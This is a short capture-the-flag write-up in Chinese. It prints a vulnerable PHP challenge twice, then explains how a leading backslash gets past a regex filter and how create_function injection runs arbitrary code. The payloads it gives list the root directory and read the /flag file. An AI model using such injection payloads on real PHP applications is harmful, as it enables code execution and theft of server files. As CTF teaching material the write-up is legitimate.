```
`<?php   //sorry , here is true last level   //^_^   error_reporting(0);   include "str.php";      $a = $_GET['a'];   $b = $_GET['b'];   if(preg_match('/^[a-z0-9_]*$/isD',$a)){    show_source(__FILE__);   }   else{    $a('',$b);   }``<?php   //sorry , here is true last level   //^_^   error_reporting(0);   include "str.php";      $a = $_GET['a'];   $b = $_GET['b'];   if(preg_match('/^[a-z0-9_]*$/isD',$a)){    show_source(__FILE__);   }   else{    $a('',$b);   }`
```


通过下面的a(′′,a(′′,b) 猜到可能是 create_function绕过  
然后那个正则表达式 让第一个字符不能为字母数字下划线  
使用exp  
`a=\create_function&b=return 'mmkjhhsd';}var_dump(scandir('/'));/*`  
发现根目录下有一个flag文件  
然后  
`a=\create_function&b=return 'mmkjhhsd';}var_dump(file_get_contents('/flag'));/*`  
获取到flag